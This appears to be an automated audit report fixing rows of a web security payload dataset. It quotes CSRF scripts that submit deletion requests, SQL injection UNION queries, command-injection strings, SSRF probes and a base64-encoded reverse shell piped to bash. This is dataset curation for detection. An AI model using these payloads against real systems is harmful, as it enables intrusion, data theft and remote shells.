# PromptShield AI — Web Security Payloads Correction & Harmonization Plan

**Generated:** 2026-10-25T11:10:25.287754+00:00  
**Target File:** `data/processed/web_security_payloads.csv`  
**Status:** Proposed Corrections (Read-Only Analysis)  

---

## Executive Summary

During the dataset quality audit, three distinct data-integrity concerns were identified in `data/processed/web_security_payloads.csv`:
1. **Missing Payload Value:** Row 238 (`csrf-039`) has a null/NaN `payload`.
2. **Conflicting Severity Annotations:** 2 distinct payload strings possess conflicting severity ratings across rows.
3. **Duplicate Payloads:** 45 duplicate payload instances across 79 rows (34 unique duplicated payload strings).

This document presents the root-cause investigation, concrete proposed corrections, and recommendations for harmonization.

---

## 1. Investigation of Missing Payload at Row 238 (`csrf-039`)

### A. Findings from Ingestion Pipeline
- **Row Index in CSV:** 238
- **Identifier:** `csrf-039`
- **Vulnerability Family:** `csrf`
- **Subtype:** `CSRF`
- **Current CSV `payload` Value:** `nan` (`NaN` / Null)
- **Current CSV `description` Value:** `CSRF using script with asyncawait fetch('https://target.com/api/async',{method:'POST',credentials:'include',body:'action=async'});</script>`

### B. Root Cause Analysis
Inspection of the source file `data/raw/web_security_payloads_clean.json` reveals the following JSON object:
```json
{
  "id": "csrf-039",
  "description": "CSRF using script with asyncawait fetch('https://target.com/api/async',{method:'POST',credentials:'include',body:'action=async'});</script>",
  "context": "Malicious webpage",
  "type": "CSRF",
  "severity": "high"
}
```

**Conclusion:** During data creation, the `payload` key was omitted entirely from the JSON object. Instead, the HTML/JavaScript payload code was inadvertently appended directly into the `description` text string: `...fetch('https://target.com/api/async',...);</script>`.

### C. Proposed Remediation
Split the malformed description into a clean description and the intended functional payload:
- **Proposed `description`:** `CSRF using script with async/await fetch`
- **Proposed `payload`:** `<script>(async()=>{await fetch('https://target.com/api/async',{method:'POST',credentials:'include',body:'action=async'});})();</script>`
- **Proposed `severity`:** `high`
- **Proposed `context`:** `Malicious webpage`

---

## 2. Investigation of Conflicting Severity Annotations

### Case 1: Payload `; echo injected` (Command Injection)
- **Affected Rows:**
  - `cmdinj-014` (Row 413): Subtype: `Command Injection`, Context: `Simple echo injection`, Severity: `medium`
  - `cmdinj-024` (Row 423): Subtype: `Command Injection`, Context: `Hex encoded space character`, Severity: `medium`
  - `cmdinj-092` (Row 491): Subtype: `Command Injection`, Context: `Unicode encoded echo command`, Severity: `high`

**Root Cause:**
- For `cmdinj-024` and `cmdinj-092`, the authors intended to test encoded evasion variations (Hex and Unicode). However, the plain decoded string `; echo injected` was mistakenly inserted into the payload column for both rows.
- Because `; echo injected` is a non-destructive proof-of-concept (POC) command injection (merely printing text rather than reading `/etc/passwd` or executing a reverse shell), its inherent severity is `medium`.

**Proposed Harmonization:**
- **Option A (Recommended for plain string consistency):** Set `severity = medium` for `cmdinj-092`, ensuring all plain echo injections share a unified severity.
- **Option B (Preserve encoded evasion test):** If encoding was intended:
  - `cmdinj-024` payload should be encoded: `;%20echo%20injected` (or `%3B%20echo%20injected`)
  - `cmdinj-092` payload should be Unicode-encoded: `; echo injected`

---

### Case 2: SVG Script Injection Targeting `/api/delete` (CSRF)
- **Payload:** `<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>`
- **Affected Rows:**
  - `csrf-009` (Row 208): Description: `CSRF using SVG with embedded script and form submission`, Severity: `high`
  - `csrf-025` (Row 224): Description: `CSRF using SVG with embedded script to submit form`, Severity: `critical`

**Root Cause:**
- The exact same payload and context (`Malicious webpage`) were duplicated with slightly different descriptions, and annotated with two different severity levels.

**Severity Context in Security Standards (CVSS v3.1 / v4.0):**
- A cross-site request forgery that triggers sensitive state deletion (`/api/delete`) in an authenticated browser session without administrative authentication bypass typically maps to CVSS 7.5–8.1 (`High`).
- It only qualifies as `Critical` (CVSS ≥ 9.0) if it leads to unauthenticated root takeover or complete remote code execution.

**Proposed Harmonization:**
- Align both `csrf-009` and `csrf-025` to `severity = high`.

---

## 3. Duplicate Payloads: Exact Redundancy vs Multi-Context Legitimacy

The dataset contains **45 duplicate payload instances** across 79 rows (34 unique payloads):

### A. Exact Redundant Duplicates (Identical Payload, Subtype, Context, and Severity)
Found **15 payload groups** where rows are purely redundant clones:
- Example: `' UNION SELECT user(), NULL--` appears 5 times (`sqli-035`, `sqli-050`, `sqli-063`, `sqli-080`, `sqli-093`) with identical subtype (`union`), context (`Generic SQL injection`), and severity (`high`).
- Example: `' UNION SELECT schema_name, NULL FROM information_schema.schemata--` appears 4 times with identical metadata.
- Example: `; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash` appears 3 times.
- **Recommendation:** These exact duplicates add artificial weight skew during evaluation and should be pruned to 1 canonical record per variant during final dataset consolidation.

### B. Multi-Context / Legitimate Contextual Duplicates
Found **19 payload groups** where identical payloads operate in different contexts:
- Example: `http://127.0.0.1/put` appears across different HTTP verb test contexts (POST vs PUT vs GET SSRF probes).
- Example: `; whoami` appears in simple shell injection vs backgrounded command execution.
- **Recommendation:** Preserve multi-context examples when the `context` or `description` field documents distinct attack surfaces or protocols.
